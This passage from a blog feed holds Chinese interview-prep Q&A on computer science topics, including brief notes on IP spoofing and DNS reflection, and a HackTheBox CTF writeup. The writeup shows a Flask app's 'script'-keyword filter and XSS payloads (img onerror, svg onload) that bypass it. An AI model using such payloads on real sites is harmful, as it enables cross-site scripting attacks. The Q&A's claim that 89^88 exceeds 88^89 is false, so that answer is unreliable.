使用可超時的鎖操作來避免等待超過一定時間。比如，在 tryLock 時限內獲取不到鎖，就自動放棄。</li><li>檢測並回收: 對於複雜的鎖定場景，可以使用監控機制檢測死鎖並回收資源。</li><li>減少鎖定的資源範圍: 減少每個線程持有鎖的時間或範圍，減少死鎖的可能性。</li></ul></li><li><p>Q: 問一堆 OS。<br>A: 先跳過，晚點回來整理一些 OS 常考觀念。</p></li><li><p>Q: Compiler 會做什麼<br>A: 編譯器（compiler）是用來將高階程式語言（例如 C、C++、Java 等）的程式碼轉換成機器碼，最後產生可執行檔案。編譯器的工作流程包含以下幾個重要階段：</p><ol><li><p>詞彙分析（Lexical Analysis）</p><ul><li>將原始程式碼分解為基本語彙單元（tokens），例如關鍵字、變數名稱、運算符等。</li><li>詞彙分析器會掃描程式碼，識別出這些基本單元，並移除空格與註解。</li></ul></li><li><p>語法分析（Syntax Analysis）</p><ul><li>將詞彙分析產生的語彙單元組合成樹狀結構（抽象語法樹，AST），確認語法是否符合語言的規範。</li><li>若語法不正確（如缺少分號或括號不匹配），編譯器會在此階段回報錯誤。</li></ul></li><li><p>語意分析（Semantic Analysis）</p><ul><li>確認變數是否已宣告、資料型態是否相容等，保證程式的邏輯正確。</li><li>若有型態錯誤（例如將字串賦值給整數變數），編譯器會在此階段回報錯誤。</li></ul></li><li><p>中間碼生成（Intermediate Code Generation）</p><ul><li>將抽象語法樹轉換為中間碼（例如三位元運算或虛擬機碼），這種碼比原始程式碼更接近機器碼，但仍具有可移植性。</li><li>中間碼提供了程式優化的基礎，並提升了跨平台的適應性。</li></ul></li><li><p>最佳化（Optimization）</p><ul><li>程式最佳化器會在中間碼上進行優化，提升執行效率或減少記憶體用量。例如迴圈優化、常數摺疊（constant folding）、無效碼刪除（dead code elimination）等。</li><li>不同的優化級別（例如 O1、O2、O3）提供了不同深度的優化。</li></ul></li><li><p>目標碼生成（Code Generation）</p><ul><li>將最佳化後的中間碼轉換為特定平台的機器碼或組合語言，並進行暫存器分配、指令選擇等工作。</li><li>這個階段的輸出是與硬體相關的機器碼，並可能進行進一步的精細優化。</li></ul></li><li><p>連結（Linking）</p><ul><li>將不同模組或函式庫連結在一起，解決外部符號（如外部變數或函式）的參照，產生最終的可執行檔案。</li><li>靜態連結會將所有依賴打包進可執行檔案，而動態連結則讓程式在執行時載入外部函式庫。</li></ul></li></ol></li><li><p>Q: Compiler 裡面是什麼結構?<br>A:<br>編譯器的內部結構通常由多個相互協作的模組組成，每個模組負責不同的功能，構成了完整的編譯過程。以下是編譯器的主要組成結構：</p><ol><li><p>前端（Front End）</p><ul><li>詞法分析器（Lexical Analyzer）：也稱為掃描器，負責將程式碼轉換成基本的詞素或符號（tokens）。這些詞素是語言的最小單位，例如變數、關鍵字、操作符等。</li><li>語法分析器（Syntax Analyzer）：也稱為剖析器，接收詞法分析器輸出的詞素序列，將其構建成抽象語法樹（AST），確認語法是否符合語言的文法規範。</li><li>語意分析器（Semantic Analyzer）：負責檢查語意是否正確，確保變數型態正確、函數調用是否合理等，並建立符號表（Symbol Table）以管理變數和函數的符號資訊。</li><li>中介碼生成器（Intermediate Code Generator）：將語法樹或語意樹轉換成平台中立的中介碼（Intermediate Representation, IR），為後續的最佳化與生成機器碼奠定基礎。</li></ul></li><li><p>中間層（Middle End）</p><ul><li>最佳化模組（Optimizer）：負責進行程式碼優化。此模組包括許多針對中介碼的優化步驟，例如循環優化、無效程式碼刪除、變數折疊（constant folding）、內聯（inlining）等，藉此提高程式效率。</li><li>數據流分析（Data Flow Analysis）：追蹤變數和指令的數據流，以便進一步優化，如消除死碼（dead code elimination）、拋棄無用的變數存取等。</li><li>控制流分析（Control Flow Analysis）：分析程式的控制流結構，進行一些跨區塊的最佳化處理，如區塊重新排序或分支預測（branch prediction）等。</li></ul></li><li><p>後端（Back End）</p><ul><li>目標碼生成器（Code Generator）：將優化後的中介碼轉換為特定硬體架構的機器碼或組合語言碼。這涉及選擇合適的指令集、暫存器分配等。</li><li>寄存器分配器（Register Allocator）：將變數映射到有限的硬體寄存器上，從而提高執行效率，減少內存訪問。</li><li>指令選擇器（Instruction Selector）：選擇適合目標硬體的機器指令，優化指令長度、減少執行時間。</li><li>匯編器與連結器（Assembler and Linker）：生成可執行檔案的最終步驟。匯編器將機器指令轉換為二進制碼，連結器將不同的模組或函數庫連結在一起，產生最終的可執行程式。</li></ul></li><li><p>符號表（Symbol Table）</p><ul><li>符號表是一個查詢資料結構，用來記錄變數、函數、類別等符號的名稱、型態、作用域及記憶體位址等資訊。此表由前端模組生成，並在中間層和後端用於優化與生成碼。</li></ul></li><li><p>抽象語法樹（AST, Abstract Syntax Tree）</p><ul><li>AST 是編譯器表示語法結構的樹狀資料結構，由語法分析器生成，並由語意分析器和最佳化模組進行進一步處理。AST 提供了一種簡化的樹形表示方式，使得編譯過程中的變換和優化更加方便。</li></ul></li><li><p>錯誤處理模組（Error Handling Module）</p><ul><li>編譯器中的錯誤處理模組用來捕捉並報告編譯過程中的詞法、語法和語意錯誤，並提供錯誤位置和建議修正信息，以幫助開發者快速修正程式碼。</li></ul></li><li><p>日誌與除錯模組（Logging and Debugging Module）</p><ul><li>此模組用來記錄編譯器執行過程中的信息，便於開發人員除錯和追蹤編譯器行為。日誌記錄對大型編譯器的維護和擴展具有重要作用。</li></ul></li></ol></li><li><p>Q: 50^99 跟 99! 誰比較大？<br>A: 我們可以都取對數來比較就會變成比較 99ln(50) 跟 99ln(99) - 99，所以 99! 應該會比較大。</p></li><li><p>Q: 88^89 跟 89^88 誰比較大？<br>A: 基數和指數相近時的比較方法：當基數和指數很接近時，可以考慮基數略大的那個數的次方更大。因為 89 比 88 稍大，而指數相差不大，所以 89^{88} 的增長會略微快於 88^{89}。</p></li><li><p>Q: 請問 IaaS、PaaS、SaaS 的差別，舉例說明。<br>A: </p><ul><li>IaaS（Infrastructure as a Service）提供基礎的 IT 基礎架構，包含虛擬機器、儲存、網路等資源。使用者可以直接管理和控制這些基礎設施（如選擇作業系統、安裝軟體），但不需要維護實體硬體。例子：Amazon Web Services (AWS) EC2、Microsoft Azure Virtual Machines、Google Compute Engine。</li><li>PaaS（Platform as a Service）提供的是平台層級的服務，包含運行應用所需的作業系統、中介軟體和開發工具等基礎設施。開發者可以在這個平台上開發、運行和管理應用程式，而不需要處理底層的基礎架構。例子：Google App Engine、Microsoft Azure App  </li><li>SaaS (Software as a Service) 是一種軟體服務模式，用戶可以透過網路直接使用軟體應用程式，無需安裝、配置和管理軟體。這些軟體通常運行在提供商的伺服器上，並透過瀏覽器或客戶端應用程式來訪問。例子：Google Workspace (如 Gmail、Google Drive)、Salesforce、Microsoft 365。</li></ul></li><li><p>Q: VM 跟 Container 差在哪裡，分別適合什麼時候用?<br>A: </p><table><thead><tr><th>特徵</th><th>VM（Virtual Machine）</th><th>Container</th></tr></thead><tbody><tr><td><strong>架構</strong></td><td>包含完整的 OS，包括內核和應用程式</td><td>共用宿主機的 OS 內核，只包含應用和依賴</td></tr><tr><td><strong>啟動速度</strong></td><td>慢（需要完整的作業系統啟動時間）</td><td>快（秒級別啟動）</td></tr><tr><td><strong>資源使用</strong></td><td>重（每個 VM 需要獨立的 OS，消耗更多資源）</td><td>輕（共用內核，資源需求低）</td></tr><tr><td><strong>隔離性</strong></td><td>高，VM 之間完全隔離</td><td>中等，共用內核但仍具備一定程度的隔離性</td></tr><tr><td><strong>可移植性</strong></td><td>受限於不同的虛擬化技術和環境</td><td>高，可以在任何支持容器的平台上運行</td></tr><tr><td><strong>管理</strong></td><td>需要管理整個作業系統和應用程式</td><td>只需管理應用和依賴</td></tr></tbody></table><p>總結：</p><ul><li>VM 提供較高的隔離性和完整的操作系統環境，適合多作業系統需求或安全性要求較高的應用。</li><li>Container 則著重輕量和快速啟動，非常適合 DevOps 流程、微服務架構和雲端原生應用。</li></ul></li><li><p>Q: 簡單說明 Hash 並列出兩個 Hash 的特性<br>A: Hash 是一種將輸入數據（例如文字或文件）透過特定演算法轉換為固定長度的字串（稱為 hash 值或 hash 碼）的技術。這種轉換是單向的，即很難或不可能從 hash 值還原原始數據。Hash 常用於數據完整性驗證、密碼存儲和數位簽章。<br>Hash 的兩個特性：</p><ul><li>不可逆性<br>Hash 是單向的，理論上無法從 hash 值反推出原始數據。這使得 hash 適合用於密碼存儲和數據隱私保護。</li><li>碰撞抗性<br>碰撞抗性表示很難找到兩組不同的輸入會產生相同的 hash 值。理想情況下，兩個不同的輸入數據應該有不同的 hash 值，以防止碰撞攻擊（Collision Attack）。</li></ul></li><li><p>Q: Lex 和 Yacc 是什麼？<br>A: </p><ul><li>Lex 是一個詞法分析器生成器，它負責將輸入的文字分解成詞素（Token），也就是程式碼的最小語法單位，例如關鍵字、變數名、數字等。Lex 會依照規則識別這些詞素，並為每個詞素分配一個特定的型別（Token type），供語法分析器（如 Yacc）進行處理。</li><li>Yacc 是一個語法分析器生成器，它使用來自 Lex 的詞素來構建語法樹或解析樹。Yacc 使用上下文無關文法（CFG）來描述語法結構，並基於這些規則解析詞素的結構。Yacc 的全稱是 “Yet Another Compiler Compiler”。</li></ul><p>實例說明：<br>假設我們要解析一個簡單的數學表達式 3 + 5 * (2 - 1)：</p><ul><li>Lex 負責分解為詞素：3、+、5、*、(、2、-、1、)</li><li>Yacc 根據運算規則（例如先乘除後加減）構建語法樹，解釋這個表達式的結構和順序</li></ul></li><li><p>Q: C 的 Functional Pointer 相關問題<br>A: 暫時跳過</p></li><li><p>Q: 雜湊函數 Hash,常見的例子<br>A: </p><ul><li>MD5（Message Digest Algorithm 5）<ul><li>特性：產生 128 位元（16 字節）的雜湊值，速度快，適合快速查找或驗證。</li><li>用途：早期用於數據完整性驗證和密碼儲存，但由於弱抗碰撞性（容易找到兩個不同輸入產生相同的雜湊值），現在已不建議用於安全敏感的應用。</li></ul></li><li>SHA-256（Secure Hash Algorithm 256）<ul><li>特性：屬於 SHA-2 系列，產生 256 位元（32 字節）的雜湊值，具有較高的抗碰撞性。</li><li>用途：目前在許多安全場景中被廣泛使用，如數據簽名、區塊鏈和證書驗證。</li></ul></li></ul></li><li><p>Q: Android IP Spoofing 是什麼？<br>A: Android IP Spoofing 是一種網路攻擊技術，通過偽造 IP 地址來掩蓋發送端的真實身份，以實現未經授權的數據訪問或繞過安全限制。這種技術通常被用來發起分佈式拒絕服務攻擊（DDoS）或繞過基於 IP 的防火牆等。IP spoofing 並不局限於 Android 平台，但在 Android 設備上，攻擊者可以利用特定的網路工具或自定義應用程序來偽造發送端的 IP 地址。</p></li></ol><h3 id="109-考古題"><a href="#109-考古題" class="headerlink" title="109 考古題"></a>109 考古題</h3><ul><li><a class="link"   href="https://hackmd.io/@splitline/BkALfYY5r" >https://hackmd.io/@splitline/BkALfYY5r <i class="fa-regular fa-arrow-up-right-from-square fa-sm"></i></a></li></ul><ol><li>   Q: Node.js 的出現有什麼很大的影響？它有什麼特色？<br>  A: Node.js 改變了後端開發的方式，允許使用 JavaScript 建構非同步、事件驅動的高效能應用。特色包括單執行緒模型、高效能 I&#x2F;O 處理、支援 NPM 等模組化設計。</li><li>   Q: 比較分析 React vs Vue 或 Angular 或你用過的前端框架<br>  A: React 側重於 UI 元件化、可重複利用和快速渲染；Vue 易於學習、雙向數據綁定、靈活性高；Angular 是完整框架，擁有強類型支援和完整工具鏈，適合大型應用。</li><li>   Q: 常用的網管工具有哪些？<br>  A: 常用工具包括 Wireshark、Nagios、Zabbix、Prometheus、Grafana 和 Nmap，這些工具幫助監控網絡流量、伺服器健康度、效能和安全性。</li><li>   Q: 如何撰寫 int freq_mode(int a, int b, int c, int d)，回傳眾數出現的次數？<br>  A: 透過使用 STL 的 std::map 或 unordered_map 來計算每個數字的出現次數，找出最高次數即可。</li><li>   Q: 如何實作包覆三維平面上的 n 個點的球型，半徑必須小於最小解的兩倍，且達到 O(n) 解？<br>  A: 可使用 Welzl’s Algorithm，逐點隨機放置到球體中，重複至包覆所有點。此方法達成 O(n) 複雜度。</li><li>   Q: 如何找出陣列 int A[n] 第二小的數並達成 O(n) 解？<br>  A: 使用線性掃描過濾出最小和第二小的元素，藉由一次遍歷達到 O(n) 複雜度，無法比 Ω(n) 更快。</li><li>   Q: memory allocation 太慢怎麼 debug？可以用什麼工具解決？<br>  A: 使用 valgrind 的 massif 或 perf 工具檢查記憶體分配問題；可透過記憶體池（memory pool）改善效率。</li><li>   Q: IDS（入侵檢測系統）和 AV（防毒軟體）有何不同？各檢查什麼？為什麼很難擋住 APT？<br>  A: IDS 側重於網路流量分析，AV 側重於檢測檔案特徵碼。APT 較隱蔽，利用多層次和持久性，難以單靠 IDS 和 AV 攔截。</li><li>   Q: 為什麼 hashing 在 Linux Kernel 中那麼常見？<br>  A: Hashing 能夠快速查找數據，適合處理 Kernel 中大量數據管理的需求，如系統調度、文件快取和網路路由。</li><li>   Q: 舉一個你會實作的較複雜演算法，並用 30 字簡介<br> A: Floyd-Warshall 演算法，用於計算所有點對間的最短路徑，複雜度為 O(n^3)，適合密集圖。</li><li>   Q: Stack 和 Queue 分別是什麼？分別適用於什麼演算法？<br> A: Stack（堆疊）為先進後出，常用於遞迴和 DFS；Queue（佇列）為先進先出，適用於 BFS 和排程。</li><li>   Q: 開發 Linux Kernel 或 Driver 時如何 debug？可以不重新編譯測試多筆輸入嗎？<br> A: 可使用 kgdb、ftrace 或 dmesg 進行 Kernel debug，可透過 debugfs 或動態修改 sysfs 參數以測試不同輸入。</li><li>   Q: Android 手機可以進行 IP Spoofing 嗎？如何操作？<br> A: 可以，在 Root 權限下使用 iptables 或自訂 Socket 寫入自訂 IP 地址達到 IP Spoofing 效果。</li><li>   Q: 如何在 Wi-Fi Router 上新增 C 程式功能？需要哪些工具？<br> A: 編譯 OpenWRT&#x2F;DD-WRT 或使用開源韌體 SDK 編寫，使用交叉編譯工具、串口燒錄和適配器。</li><li>   Q: GMM 和 K-means 有何不同？請說明原理<br> A: K-means 假設每個叢集形狀為圓，GMM 利用高斯分布來估計，允許各叢集有不同形狀。</li><li>   Q: Server 虛擬化的好處是什麼？常用的工具有哪些？<br> A: Server 虛擬化增加資源利用率和隔離性，工具有 VMware、KVM、Hyper-V 和 VirtualBox 等。</li><li>   Q: 解釋加速方式 (a) SIMD (b) GPGPU (c) FPGA (d) MPI 並舉例<br> A: (a) SIMD: 單指令多數據，如向量計算；(b) GPGPU: 使用 GPU 做並行運算，如 AI 訓練；(c) FPGA: 可重組邏輯，加速專用計算；(d) MPI: 分散式多處理，如超級計算機。</li><li>   Q: 偵錯效能瓶頸 (a) 程式瓶頸 (b) 快取缺失 (c) 區域性問題<br> A: (a) 程式瓶頸：分析 perf；(b) 快取缺失：調整數據結構和存取模式；(c) 區域性：改善記憶體區域性。</li><li>   Q: DNS 反射攻擊如何實作？<br> A: 利用開放的 DNS 伺服器將查詢反射至目標 IP，造成拒絕服務，使用小詢問封包造成大回應。</li><li>   Q: 說明 Attention 機制<br> A: Attention 用於提升深度學習模型的效能，透過關注重要部分資料，使模型更高效學習關鍵特徵。</li><li>   Q: 你的開發環境？有無 GitHub 協作經驗或程式檢定經驗？<br> A: 使用 VSCode 和 Git，擁有 GitHub 協作經驗</li><li>   Q: 你負責的最具挑戰的專案或成就？<br> A: 略</li></ol>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;交大資工所丙組性向測驗準備&quot;&gt;&lt;a href=&quot;#交大資工所丙組性向測驗準備&quot; class=&quot;headerlink&quot; title=&quot;交大資工所丙組性向測驗準備&quot;&gt;&lt;/a&gt;交大資工所丙組性向測驗準備&lt;/h2&gt;&lt;p&gt;如果有重複出現的會直接拿掉&lt;/p&gt;
&lt;h3 id=&quot;</summary>
      
    
    
    
    
    <category term="education" scheme="https://kazma.tw/tags/education/"/>
    
    <category term="career" scheme="https://kazma.tw/tags/career/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges SpookTastic Writeup</title>
    <link href="https://kazma.tw/2024/11/02/HackTheBox-Challenges-SpookTastic-Writeup/"/>
    <id>https://kazma.tw/2024/11/02/HackTheBox-Challenges-SpookTastic-Writeup/</id>
    <published>2024-11-02T05:39:19.850Z</published>
    <updated>2024-11-02T06:18:11.211Z</updated>
    
    <content type="html"><![CDATA[<h2 id="Exploitation"><a href="#Exploitation" class="headerlink" title="Exploitation"></a>Exploitation</h2><p>我們直接來看主程式：</p><div class="highlight-container" data-rel="Python"><figure class="iseeu highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> random, string</span><br><span class="line"><span class="keyword">from</span> flask <span class="keyword">import</span> Flask, request, render_template, abort</span><br><span class="line"><span class="keyword">from</span> flask_socketio <span class="keyword">import</span> SocketIO</span><br><span class="line"><span class="keyword">from</span> threading <span class="keyword">import</span> Thread</span><br><span class="line"></span><br><span class="line">app = Flask(__name__)</span><br><span class="line"></span><br><span class="line">socketio = SocketIO(app)</span><br><span class="line"></span><br><span class="line">registered_emails, socket_clients = [], &#123;&#125;</span><br><span class="line"></span><br><span class="line">generate = <span class="keyword">lambda</span> x: <span class="string">&quot;&quot;</span>.join([random.choice(string.hexdigits) <span class="keyword">for</span> _ <span class="keyword">in</span> <span class="built_in">range</span>(x)])</span><br><span class="line">BOT_TOKEN = generate(<span class="number">16</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">blacklist_pass</span>(<span class="params">email</span>):</span><br><span class="line">    email = email.lower()</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="string">&quot;script&quot;</span> <span class="keyword">in</span> email:</span><br><span class="line">        <span class="keyword">return</span> <span class="literal">False</span></span><br><span class="line"></span><br><span class="line">    <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_flag</span>(<span class="params">user_ip</span>):</span><br><span class="line">    <span class="keyword">for</span> <span class="built_in">id</span>, ip <span class="keyword">in</span> socket_clients.items():</span><br><span class="line">        <span class="keyword">if</span> ip == user_ip:</span><br><span class="line">            socketio.emit(<span class="string">&quot;flag&quot;</span>, &#123;<span class="string">&quot;flag&quot;</span>: <span class="built_in">open</span>(<span class="string">&quot;flag.txt&quot;</span>).read()&#125;, room=<span class="built_in">id</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start_bot</span>(<span class="params">user_ip</span>):</span><br><span class="line">    <span class="keyword">from</span> selenium <span class="keyword">import</span> webdriver</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.chrome.options <span class="keyword">import</span> Options</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.chrome.service <span class="keyword">import</span> Service</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.support.ui <span class="keyword">import</span> WebDriverWait</span><br><span class="line">    <span class="keyword">from</span> selenium.webdriver.support <span class="keyword">import</span> expected_conditions <span class="keyword">as</span> EC</span><br><span class="line"></span><br><span class="line">    host, port = <span class="string">&quot;localhost&quot;</span>, <span class="number">1337</span></span><br><span class="line">    HOST = <span class="string">f&quot;http://<span class="subst">&#123;host&#125;</span>:<span class="subst">&#123;port&#125;</span>&quot;</span></span><br><span class="line"></span><br><span class="line">    options = Options()</span><br><span class="line"></span><br><span class="line">    options.add_argument(<span class="string">&quot;--headless&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--no-sandbox&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-dev-shm-usage&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-infobars&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-background-networking&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-default-apps&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-extensions&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-gpu&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-sync&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disable-translate&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--hide-scrollbars&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--metrics-recording-only&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--mute-audio&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--no-first-run&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--dns-prefetch-disable&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--safebrowsing-disable-auto-update&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--media-cache-size=1&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--disk-cache-size=1&quot;</span>)</span><br><span class="line">    options.add_argument(<span class="string">&quot;--user-agent=HTB/1.0&quot;</span>)</span><br><span class="line"></span><br><span class="line">    service = Service(executable_path=<span class="string">&quot;/usr/bin/chromedriver&quot;</span>)</span><br><span class="line">    browser = webdriver.Chrome(service=service, options=options)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">try</span>:</span><br><span class="line">        browser.get(<span class="string">f&quot;<span class="subst">&#123;HOST&#125;</span>/bot?token=<span class="subst">&#123;BOT_TOKEN&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">        WebDriverWait(browser, <span class="number">3</span>).until(EC.alert_is_present())</span><br><span class="line"></span><br><span class="line">        alert = browser.switch_to.alert</span><br><span class="line">        alert.accept()</span><br><span class="line">        send_flag(user_ip)</span><br><span class="line">    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">        <span class="keyword">pass</span></span><br><span class="line">    <span class="keyword">finally</span>:</span><br><span class="line">        registered_emails.clear()</span><br><span class="line">        browser.quit()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">index</span>():</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;index.html&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/api/register&quot;</span>, methods=[<span class="string">&quot;POST&quot;</span>]</span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">register</span>():</span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> request.is_json <span class="keyword">or</span> <span class="keyword">not</span> request.json[<span class="string">&quot;email&quot;</span>]:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">400</span>)</span><br><span class="line"></span><br><span class="line">    <span class="keyword">if</span> <span class="keyword">not</span> blacklist_pass(request.json[<span class="string">&quot;email&quot;</span>]):</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">401</span>)</span><br><span class="line"></span><br><span class="line">    registered_emails.append(request.json[<span class="string">&quot;email&quot;</span>])</span><br><span class="line">    Thread(target=start_bot, args=(request.remote_addr,)).start()</span><br><span class="line">    <span class="keyword">return</span> &#123;<span class="string">&quot;success&quot;</span>:<span class="literal">True</span>&#125;</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@app.route(<span class="params"><span class="string">&quot;/bot&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">bot</span>():</span><br><span class="line">    <span class="keyword">if</span> request.args.get(<span class="string">&quot;token&quot;</span>, <span class="string">&quot;&quot;</span>) != BOT_TOKEN:</span><br><span class="line">        <span class="keyword">return</span> abort(<span class="number">404</span>)</span><br><span class="line">    <span class="keyword">return</span> render_template(<span class="string">&quot;bot.html&quot;</span>, emails=registered_emails)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&quot;connect&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_connect</span>():</span><br><span class="line">    socket_clients[request.sid] = request.remote_addr</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="meta">@socketio.on(<span class="params"><span class="string">&quot;disconnect&quot;</span></span>)</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">on_disconnect</span>():</span><br><span class="line">    <span class="keyword">del</span> socket_clients[request.sid]</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">if</span> __name__ == <span class="string">&quot;__main__&quot;</span>:</span><br><span class="line">    app.run(host=<span class="string">&quot;0.0.0.0&quot;</span>, port=<span class="number">1337</span>, debug=<span class="literal">False</span>)</span><br></pre></td></tr></table></figure></div><p>我們可以看到他讓我們註冊信箱，然後會檢查 email 有沒有包含 script 關鍵字，如果我們成功繞過 script 觸發 alert 就會 sendFlag，所以目標就是不含 script 的 XSS。<br>以下放上一些 payload 供參考：</p><div class="highlight-container" data-rel="Javascript"><figure class="iseeu highlight javascript"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">&lt;img src=<span class="string">&quot;invalid.jpg&quot;</span> onerror=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><br><span class="line"><span class="language-xml"><span class="tag">&lt;<span class="name">svg</span> <span class="attr">onload</span>=<span class="string">&quot;alert(&#x27;XSS&#x27;)&quot;</span>&gt;</span><span class="tag">&lt;/<span class="name">svg</span>&gt;</span></span></span><br></pre></td></tr></table></figure></div><h4 id="Pwned"><a href="#Pwned" class="headerlink" title="Pwned !!!"></a>Pwned !!!</h4><p><img                       lazyload                     src="/images/loading.svg"                     data-src="/../images/alert_pwn.png"                      alt="pwn"                ></p>]]></content>
    
    
      
      
    <summary type="html">&lt;h2 id=&quot;Exploitation&quot;&gt;&lt;a href=&quot;#Exploitation&quot; class=&quot;headerlink&quot; title=&quot;Exploitation&quot;&gt;&lt;/a&gt;Exploitation&lt;/h2&gt;&lt;p&gt;我們直接來看主程式：&lt;/p&gt;
&lt;div class=&quot;hig</summary>
      
    
    
    
    
    <category term="htb" scheme="https://kazma.tw/tags/htb/"/>
    
    <category term="challenges" scheme="https://kazma.tw/tags/challenges/"/>
    
    <category term="writeup&#39;" scheme="https://kazma.tw/tags/writeup/"/>
    
    <category term="web" scheme="https://kazma.tw/tags/web/"/>
    
    <category term="xss" scheme="https://kazma.tw/tags/xss/"/>
    
  </entry>
  
  <entry>
    <title>HackTheBox-Challenges Juggling facts Writeup</title>
    <link href="https://kazma.tw/2024/11/02/HackTheBox-Challenges-Juggling-facts-Writeup/"/>
    <id>https://kazma.tw/2024/11/02/HackTheBox-Challenges-Juggling-facts-Writeup/</id>
    <published>2024-11-01T17:50:29.643Z</published>
    <updated>2024-11-01T18:28:05.725Z</updated>
    
